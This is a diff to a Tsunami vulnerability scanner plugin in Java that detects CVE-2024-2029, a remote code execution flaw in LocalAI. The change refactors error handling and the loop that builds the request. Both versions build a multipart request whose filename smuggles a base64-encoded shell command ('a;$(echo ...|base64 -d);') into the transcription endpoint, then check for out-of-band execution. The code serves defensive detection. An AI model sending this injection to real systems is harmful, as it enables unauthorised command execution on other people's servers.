@@ -19,7 +19,6 @@ package com.google.tsunami.plugins.detectors.rce.cve20242029;
 import static com.google.common.base.Preconditions.checkNotNull;
 import static com.google.common.collect.ImmutableList.toImmutableList;
 import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
-import static com.google.common.net.HttpHeaders.USER_AGENT;
 import static com.google.tsunami.common.net.http.HttpRequest.get;
 import static com.google.tsunami.common.net.http.HttpRequest.post;
 import static java.nio.charset.StandardCharsets.UTF_8;
@@ -27,7 +26,6 @@ import static java.nio.charset.StandardCharsets.UTF_8;
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
 import com.google.common.io.BaseEncoding;
-import com.google.common.io.Resources;
 import com.google.common.util.concurrent.Uninterruptibles;
 import com.google.gson.JsonArray;
 import com.google.gson.JsonElement;
@@ -118,12 +116,18 @@ public final class LocalAiCve20242029RceDetector implements VulnDetector {
     try {
       response = httpClient.send(get(modelsUrl).withEmptyHeaders().build(), networkService);
     } catch (IOException e) {
-      throw new RuntimeException(e);
+      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUrl);
+      return false;
     }
     if (response.bodyJson().isEmpty()) {
       return false;
     }
-    return !response.bodyJson().get().getAsJsonObject().get("object").getAsString().isEmpty();
+    try {
+      return !response.bodyJson().get().getAsJsonObject().get("object").getAsString().isEmpty();
+    } catch (IllegalStateException e) {
+      logger.atWarning().withCause(e).log("Unable to get response body as a JSON Object.");
+    }
+    return false;
   }
 
   private boolean isServiceVulnerable(NetworkService networkService) {
@@ -144,59 +148,53 @@ public final class LocalAiCve20242029RceDetector implements VulnDetector {
       if (response.bodyString().isEmpty()) {
         return false;
       }
-      ByteArrayOutputStream output = new ByteArrayOutputStream();
+      JsonArray models =
+          JsonParser.parseString(response.bodyString().get())
+              .getAsJsonObject()
+              .get("data")
+              .getAsJsonArray();
 
-      // starting the building of the HTTP POST Body
-      output.write("--------------------------YMvF9bJTpBcQA5CcxzUEx3\r\n".getBytes(UTF_8));
-      output.write(
-          String.format(
-                  "Content-Disposition: form-data; name=\"file\";"
-                      + " filename=\"a;$(echo %s|base64 -d);\"\r\n\r\n",
-                  BaseEncoding.base64().encode(payload.getPayload().getBytes(UTF_8)))
-              .getBytes(UTF_8));
-      output.write("".getBytes(UTF_8)); // empty file
-      output.write("\r\n".getBytes(UTF_8));
-      output.write("--------------------------YMvF9bJTpBcQA5CcxzUEx3\r\n".getBytes(UTF_8));
-      output.write("Content-Disposition: form-data; name=\"model\"\r\n\r\n".getBytes(UTF_8));
-
-      try {
-        JsonArray models =
-            JsonParser.parseString(response.bodyString().get())
-                .getAsJsonObject()
-                .get("data")
-                .getAsJsonArray();
-        for (JsonElement model : models) {
-          String modelStr = model.getAsJsonObject().get("id").getAsString();
-          // continue the building of the HTTP POST Body
-          output.write(modelStr.getBytes(UTF_8));
-          output.write("\r\n".getBytes(UTF_8));
-          output.write("--------------------------YMvF9bJTpBcQA5CcxzUEx3--\r\n".getBytes(UTF_8));
-          byte[] out = output.toByteArray();
-          // end of the building of the HTTP POST Body
-          HttpResponse httpResponse =
-              httpClient.send(
-                  post(targetUrl + "v1/audio/transcriptions")
-                      .setHeaders(
-                          HttpHeaders.builder()
-                              .addHeader(
-                                  CONTENT_TYPE,
-                                  "multipart/form-data;"
-                                      + " boundary=------------------------YMvF9bJTpBcQA5CcxzUEx3")
-                              .addHeader(USER_AGENT, "TSUNAMI_SCANNER")
-                              .build())
-                      .setRequestBody(ByteString.copyFrom(out))
-                      .build(),
-                  networkService);
-          if (httpResponse.bodyString().isEmpty()) {
-            continue;
-          }
-          Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));
-          return payload.checkIfExecuted();
+      for (JsonElement model : models) {
+        String modelStr = model.getAsJsonObject().get("id").getAsString();
+        // starting the building of the HTTP POST Body
+        ByteArrayOutputStream output = new ByteArrayOutputStream();
+        output.write("--------------------------YMvF9bJTpBcQA5CcxzUEx3\r\n".getBytes(UTF_8));
+        output.write(
+            String.format(
+                    "Content-Disposition: form-data; name=\"file\";"
+                        + " filename=\"a;$(echo %s|base64 -d);\"\r\n\r\n",
+                    BaseEncoding.base64().encode(payload.getPayload().getBytes(UTF_8)))
+                .getBytes(UTF_8));
+        output.write("".getBytes(UTF_8)); // empty file
+        output.write("\r\n".getBytes(UTF_8));
+        output.write("--------------------------YMvF9bJTpBcQA5CcxzUEx3\r\n".getBytes(UTF_8));
+        output.write("Content-Disposition: form-data; name=\"model\"\r\n\r\n".getBytes(UTF_8));
+        output.write(modelStr.getBytes(UTF_8));
+        output.write("\r\n".getBytes(UTF_8));
+        output.write("--------------------------YMvF9bJTpBcQA5CcxzUEx3--\r\n".getBytes(UTF_8));
+        byte[] out = output.toByteArray();
+        // end of the building of the HTTP POST Body
+        HttpResponse httpResponse =
+            httpClient.send(
+                post(targetUrl + "v1/audio/transcriptions")
+                    .setHeaders(
+                        HttpHeaders.builder()
+                            .addHeader(
+                                CONTENT_TYPE,
+                                "multipart/form-data;"
+                                    + " boundary=------------------------YMvF9bJTpBcQA5CcxzUEx3")
+                            .build())
+                    .setRequestBody(ByteString.copyFrom(out))
+                    .build(),
+                networkService);
+        if (httpResponse.bodyString().isEmpty()) {
+          continue;
         }
-
-      } catch (IllegalStateException | NullPointerException | JsonParseException e) {
-        logger.atWarning().withCause(e).log("Unable to parse response body as json");
+        Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));
+        return payload.checkIfExecuted();
       }
+    } catch (IllegalStateException | NullPointerException | JsonParseException e) {
+      logger.atWarning().withCause(e).log("Unable to parse response body as json");
     } catch (IOException e) {
       logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUrl);
     }
